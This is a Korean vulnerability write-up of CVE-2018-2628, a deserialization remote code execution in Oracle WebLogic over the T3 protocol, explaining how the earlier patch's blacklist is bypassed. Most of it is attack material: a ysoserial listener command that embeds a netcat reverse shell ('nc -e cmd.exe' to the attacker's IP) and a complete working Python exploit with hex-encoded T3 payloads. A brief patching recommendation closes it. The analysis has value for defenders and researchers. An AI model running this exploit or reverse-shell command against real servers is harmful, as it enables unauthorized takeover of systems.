# CVE-2018-2628 : Weblogic server RCE

### Summary

Target : Oracle Weblogic Server

CVE : [CVE-2018-2628](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-2628)

Version : 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3

Vulnerability : 원격 명령어 실행 (Remote Code Execution)

Platform : 모든 플랫폼

### Analysis

해당 취약점은 신뢰할 수 없는 데이터를 **역직렬화(Deserialize)**를 하며 발생하는 취약점으로 **RMI(Remote Method Invocation)** 통신 시 사용되는 **T3 Protocol**을 이용하며, 세션을 맺은 후 악의적인 페이로드를 전송하여 역직렬화된 임의의 코드가 실행되는 취약점이다.

[^역직렬화]: 직렬화를 통해 byte로 변환된 데이터를 원래의 객체나 데이터로 변환 
[^RMI Communication]: 원격 함수 호출로써 최종적인 목표는 RPC와 같으며 다른 네트워크의 객체 내 메소드 호출하는 것을 의미
[^T3 Protocol]: WebLogic Server와 다른 유형의 자바 프로그램 간의 정보를 전송하는데 사용



<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3248">CVE-2017-3248</a>(p24667634_1036_Generic) 으로 인한 패치 내용을 보면 '*resolveProxyClass*' 내에서 RMI 인터페이스의 '*java.rmi.registry.Registry*' 유형만 필터링하여 해당 취약점을 보완한 것을 확인할 수 있다.

```java
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;
   for(int i$ = 0; i$ < len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals("java.rmi.registry.Registry")) { // 취약한 RMI 인터페이스
         throw new InvalidObjectException("Unauthorized proxy deserialization");
      }
   }
   return super.resolveProxyClass(interfaces);
}
```

그러나 블랙리스트 방식의 필터링을 사용하여 간단히 해당 인터페이스를 변경하여 우회가 가능하다.

해당 익스플로잇에 사용되는 도구는 **ysoserial**이란 도구로 Java의 직렬화, 역직렬화에서 발생하는 취약점을 이용해 RCE가 가능하게 하는 PoC 도구이며, 직렬화, 역직렬화 과정에서 '*Commons-Collections*' 라이브러리의 '*InvokerTransformer*' 를 악용하여 결과적으로 '*RuntimeExec*' 메소드를 호출하도록 만드는 도구이다. 위의 패치를 우회하기 위해 '*Registry*'가 아닌 '*Activator*'를 이용한다.



|   Attacker   |              Victim              |
| :----------: | :------------------------------: |
| 192.168.1.86 |           192.168.1.13           |
| Ubuntu linux | Windows (Weblogic Server 10.3.6) |

[그림 1]

아래는 실행 중인 WebLogic Server의 'config.xml' 내용이다. 10.3.6 버전으로 취약한 버전에 해당된다.

```xml
<!--config.xml-->

<name>base_domain</name>
<domain-version>10.3.6.0</domain-version> <!--취약한 버전-->

+<security-configuration>
-<server>
	<name>AdminServer</name>
	-<server-debug>
		-<debug-scope>
			<name>weblogic.t3</name>
			<enabled>true</enabled>
		</debug-scope>
		-<debug-scope>
			<name>weblogic.t3.srvr</name>
			<enabled>true</enabled>
		</debug-scope>
		<debug-server-life-cycle>true</debug-server-life-cycle>
		<debug-server-start-statistics>true</debug-server-start-statistics>
	</server-debug>
	<listen-address/>
</server>
-<embedded-ldap>
	<name>base_domain</name>
	<credential-encrypted>{AES}eXPolKQ3q15ldCBGrLJhxLmy0Zvw/fUqvCSka6SrHVXGtdQkTKfzY6v2R3KNHOrX</credential-encrypted>
	</embedded-ldap>

<configuration-version>10.3.6.0</configuration-version>
<admin-server-name>AdminServer</admin-server-name>
```

아래의 명령어를 이용하여 페이로드에 포함 할 실행 명령어(*netcat*)와 RMI 통신 포트인 **1099**를 열고 대기한다.

```
[Command]
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -e cmd.exe 192.168.1.86 4444'
```

[그림 2]

그 후 익스플로잇 코드를 이용하여 아래의 명령어를 실행 시 페이로드가 전달되며 세션이 맺어지고 역직렬화를 통해 해당 명령어가 실행되어 Weblogic Server의 쉘을 획득하는 것을 볼 수 있다.

```
[Command]
python exploit.py <target_ip> <port> ysoserial <attacker_ip> <JRMPListner_port> JRMPClient2

ex)
python exploit.py 192.168.1.13 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.1.86 1099 JRMPClient2
```

[그림 3]



아래 패킷은 T3를 통해 7001 포트와 세션을 맺는 과정의 페이로드이다. 확인해보면 위에서 전달한 '*JRMPClient2(java.rmi.activation.Activator)*'를 이용하여 필터링을 우회하는 것을 볼 수 있다.

[그림 4]

페이로드가 정상적으로 전달되어 세션을 맺고 RMI Port(1099)를 대기 중이던 공격자에게 서버가 **RMI Connection 요청**을 전달하는 것을 확인할 수 있다.

[그림 5]

그리고 **RMI Communication**을 통해 공격자가 준비한 페이로드를 전달함으로써 서버에서 해당 명령어가 실행되며 공격자가 쉘을 획득하게 된다.

[그림 6]



### Exploit

<a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar">ysoserial</a>

<a href="https://www.exploit-db.com/exploits/44553/">exploit.py</a>

```python
from __future__ import print_function
import binascii
import os
import socket
import sys
import time
 
 
def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    #generates ysoserial payload
    command = 'java -jar {} {} {}:{} > payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)
    print("command: " + command)
    os.system(command)
    bin_file = open('payload.out','rb').read()
    return binascii.hexlify(bin_file)
 
 
def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print('handshake successful')
 
 
def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print('send request payload successful,recv length:%d'%(len(sock.recv(2048))))
 
 
def send_payload_objdata(sock, data):
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res
 
 
def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print("payload: " + payload)
    rs=send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')
 
 
if __name__=="__main__":
    #check for args, print usage if incorrect
    if len(sys.argv) != 7:
        print('\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '
              '[JRMPListener ip] [JRMPListener port] [JRMPClient]\n')
        sys.exit()
 
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    path_ysoserial = sys.argv[3]
    jrmp_listener_ip = sys.argv[4]
    jrmp_listener_port = sys.argv[5]
    jrmp_client = sys.argv[6]
    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
```

### Solution

#### 업데이트

- 현재 취약한 버전의 패치가 존재하지만 **여전히 공격이 가능**한 것으로 확인 되었다. 취약한 버전을 사용하는 경우 최신 버전으로 업데이트하여 사용해야 한다.

